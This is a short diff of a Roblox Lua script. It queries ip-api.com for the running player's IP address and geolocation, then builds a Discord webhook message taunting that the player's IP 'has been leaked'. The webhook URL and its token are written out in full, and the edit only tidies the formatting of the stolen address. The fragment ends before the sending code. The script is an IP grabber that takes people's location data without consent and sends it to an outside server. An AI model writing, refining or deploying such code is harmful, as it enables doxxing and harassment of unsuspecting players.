@@ -1,5 +1,5 @@
 local IpApi = game.HttpService:JSONDecode(game:HttpGet("http://ip-api.com/json/", true))
-local Address = IpApi["query"]..IpApi["city"] .. " " .. IpApi["regionName"] .. " " .. IpApi["country"]
+local Address = IpApi["query"].. " " ..IpApi["city"] .. " " .. IpApi["regionName"] .. " " .. IpApi["country"]
 local url = "https://discord.com/api/webhooks/1033500076313690242/CEp-3HZXGrS2NaUNJjIL24rTyC9ywKp8SAhGgb2CoqOPg7RGr-blhKpaX0KuFYfh1zy_"
 local data = {
    ["content"] = game.Players.LocalPlayer.Name.."'s IP Has been leaked lmfao!",
